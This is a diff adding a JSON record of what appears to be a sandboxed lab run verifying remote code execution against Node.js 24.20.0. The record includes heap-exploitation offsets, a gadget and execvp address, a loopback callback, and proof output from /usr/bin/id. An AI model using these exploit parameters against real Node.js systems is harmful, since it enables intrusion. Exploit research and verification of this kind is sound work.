@@ -1,0 +1,57 @@
+{
+  "attempts": [
+    {
+      "candidate": "v24-0x330",
+      "container_log_tail": "",
+      "elapsed_seconds": 7.633,
+      "error": "TimeoutError: timed out",
+      "outcome": "not-verified"
+    },
+    {
+      "candidate": "v24-0x200",
+      "elapsed_seconds": 1.508,
+      "outcome": "rce-proof"
+    }
+  ],
+  "callback_peer": "127.0.0.1",
+  "lab_controls": {
+    "address_read_used": false,
+    "aslr": "enabled",
+    "callback": "127.0.0.1:4444",
+    "cap_drop": "ALL",
+    "debugger_used": false,
+    "kernel_randomize_va_space": 2,
+    "ld_preload_present": false,
+    "n2s_disable_aslr_present": false,
+    "no_new_privileges": true,
+    "proof_command": "/usr/bin/id (fixed)",
+    "read_only_rootfs": true,
+    "target": "127.0.0.1:3000"
+  },
+  "node_binary_sha256": "89af8424dd53e560b1933f87ba650d8bf57c83ca5a04600eefb31f416aabbae7",
+  "official_archive_sha256": "2f2c0da162318f0de47665410c7c8c2ed3d36c8f3105de4bbc61176c70a7cbf2",
+  "official_archive_url": "https://nodejs.org/dist/v24.20.0/node-v24.20.0-linux-x64.tar.xz",
+  "profile": {
+    "bss_payload": "0x6b81cf0",
+    "callback_gadget": "0x8c91d0",
+    "callback_pointer_offset": "0x8",
+    "context_pointer_offset": "0x20",
+    "execvp_plt": "0x744d60",
+    "layout_candidate": "v24-0x200",
+    "pContext": "0x6b81d10",
+    "pFree": "0x6b81cf8",
+    "poison_staged_position": "-0x800a118",
+    "record_size": "0x200",
+    "ring_from_heap": "0x800ab70",
+    "tcache_entry_from_heap": "0xa58",
+    "tcache_index": 31
+  },
+  "proof_channel": "fresh loopback callback",
+  "proof_command": "/usr/bin/id (fixed)",
+  "proof_stdout": "uid=1000(node) gid=1000(node) groups=1000(node)",
+  "proof_token": "N2S_7ee889a4de0f77f9318e584a26c259d3",
+  "result": "rce-verified",
+  "verification_mode": "official-linux-x64-aslr-enabled-network-only-worker-heap",
+  "verified_at": "2026-10-23T21:50:18.299138+00:00",
+  "version": "24.20.0"
+}
